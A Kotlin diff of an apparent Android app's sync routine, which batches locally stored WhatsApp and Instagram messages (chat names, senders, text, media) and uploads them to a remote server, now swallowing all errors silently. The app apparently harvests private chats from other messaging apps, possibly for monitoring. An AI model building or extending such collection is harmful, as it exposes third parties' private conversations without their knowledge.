@@ -967,50 +967,51 @@ class SyncRunner(private val context: Context) {
     }
 
     private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
-        val unsynced = db.whatsAppMessageDao().getUnsynced()
-        if (unsynced.isEmpty()) return
-
-        val dtos = unsynced.map {
-            WhatsAppMessageEntryDto(
-                chatName = it.chatName,
-                sender = it.sender,
-                messageText = it.messageText,
-                isOutgoing = it.isOutgoing,
-                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
-                mediaPath = it.mediaPath,
-                reelUrl = it.reelUrl
-            )
-        }
         try {
+            try { db.whatsAppMessageDao().clearOversizedUnsyncedBlobs() } catch (_: Throwable) {}
+            val unsynced = db.whatsAppMessageDao().getUnsynced(50)
+            if (unsynced.isEmpty()) return
+
+            val dtos = unsynced.map {
+                WhatsAppMessageEntryDto(
+                    chatName = it.chatName,
+                    sender = if (it.isOutgoing) "me" else it.sender,
+                    messageText = it.messageText,
+                    isOutgoing = it.isOutgoing,
+                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                    mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
+                    mediaPath = it.mediaPath,
+                    reelUrl = it.reelUrl
+                )
+            }
             val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
             if (response.isSuccessful) {
                 db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
                 db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
             }
-        } catch (e: Exception) {
+        } catch (_: Throwable) {
             // Retried on next scheduled run.
         }
     }
 
     private suspend fun syncInstagramMessages(bearer: String, db: AppDatabase) {
-        val unsynced = db.instagramMessageDao().getUnsynced()
-        if (unsynced.isEmpty()) return
-
-        val dtos = unsynced.map {
-            InstagramMessageEntryDto(
-                chatName = it.chatName,
-                sender = it.sender,
-                messageText = it.messageText,
-                isOutgoing = it.isOutgoing,
-                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
-                mediaPath = it.mediaPath,
-                reelUrl = it.reelUrl,
-                targetAccount = null
-            )
-        }
         try {
+            val unsynced = db.instagramMessageDao().getUnsynced(50)
+            if (unsynced.isEmpty()) return
+
+            val dtos = unsynced.map {
+                InstagramMessageEntryDto(
+                    chatName = it.chatName,
+                    sender = it.sender,
+                    messageText = it.messageText,
+                    isOutgoing = it.isOutgoing,
+                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                    mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
+                    mediaPath = it.mediaPath,
+                    reelUrl = it.reelUrl,
+                    targetAccount = null
+                )
+            }
             val response = ApiClient.service.syncInstagramMessages(
                 bearer,
                 InstagramMessagesSyncRequest(dtos, accountName = null)
@@ -1019,7 +1020,7 @@ class SyncRunner(private val context: Context) {
                 db.instagramMessageDao().markSynced(unsynced.map { it.id })
                 db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
             }
-        } catch (e: Exception) {
+        } catch (_: Throwable) {
             // Retried on next scheduled run.
         }
     }
